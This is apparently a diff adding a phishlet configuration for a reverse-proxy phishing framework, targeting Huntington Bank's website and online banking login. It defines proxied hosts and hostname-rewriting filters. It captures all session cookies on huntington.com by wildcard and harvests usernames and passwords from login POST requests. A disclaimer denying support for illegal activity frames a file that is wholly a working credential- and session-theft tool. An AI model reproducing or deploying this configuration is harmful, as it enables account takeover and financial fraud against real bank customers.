@@ -1,0 +1,62 @@
+# THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...
+
+author: '@i_am_a_Good_Human' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'huntington.com', session: true, is_landing: true}
+  - {phish_sub: 'smetrics', orig_sub: 'smetrics', domain: 'huntington.com', session: true, is_landing: false}
+  - {phish_sub: 'onlinebanking', orig_sub: 'onlinebanking', domain: 'huntington.com', session: true, is_landing: true}
+  - {phish_sub: 'ensighten', orig_sub: 'ensighten', domain: 'huntingtobank.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'huntington.com', session: true, is_landing: false}
+  - {phish_sub: 'ddata', orig_sub: 'ddata', domain: 'huntingtobank.com', session: true, is_landing: false}
+  - {phish_sub: 'ensighten', orig_sub: 'ensighten', domain: 'huntingtobank.com', session: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'googletag', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false}
+  - {phish_sub: 'players', orig_sub: 'players', domain: 'brightcove.net', session: true, is_landing: false}
+  - {phish_sub: 'vjs', orig_sub: 'vjs', domain: 'zencdn.net', session: true, is_landing: false}  
+  - {phish_sub: 'dynatrace', orig_sub: 'mef957', domain: 'dynatrace-managed.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.huntington.com', orig_sub: 'www', domain: 'huntington.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'www', domain: 'huntington.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'ensighten', domain: 'huntingtobank.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'ensighten', domain: 'huntingtobank.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'www', domain: 'google.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'players', domain: 'brightcove.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'players', domain: 'brightcove.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'vjs', domain: 'zencdn.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'vjs', domain: 'zencdn.net', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'smetrics', domain: 'huntington.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'smetrics', domain: 'huntington.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'onlinebanking', domain: 'huntington.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'onlinebanking', domain: 'huntington.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: '', domain: 'huntington.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: '', domain: 'huntington.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'ddata', domain: 'huntingtobank.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'ddata', domain: 'huntingtobank.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'mef957', domain: 'dynatrace-managed.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.huntington.com', orig_sub: 'mef957', domain: 'dynatrace-managed.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+     
+
+
+auth_tokens:
+  - domain: '.huntington.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.huntington.com'
+  path: '/mobile-login'
+  
+# THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...  
+  
